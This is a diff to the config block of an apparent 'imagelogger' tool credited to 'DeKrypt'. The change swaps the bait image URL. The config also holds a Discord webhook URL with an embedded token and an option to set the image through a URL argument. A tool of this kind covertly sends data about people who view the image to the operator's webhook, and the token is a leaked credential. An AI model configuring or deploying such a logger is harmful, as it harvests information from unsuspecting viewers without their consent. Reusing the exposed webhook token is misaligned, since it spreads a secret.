@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1192956131023270020/RF9xVzqxFsZh_8gAoFj0Sfmw8YXWTGGIESNxOZXmEeI0zfF7JOJwNawiMEc-sLCSFd6j",
-    "image": "https://static.wikia.nocookie.net/c88308f3-e20e-41ca-a94a-e715b56e2b6b/scale-to-width/755", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1318292045277691957/1319738488081612931/IMG_4545.png?ex=67670dbf&is=6765bc3f&hm=605f5dd19e5878d128dcce52144d645b977ea3c21a182059c35fd49b1212f00a&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
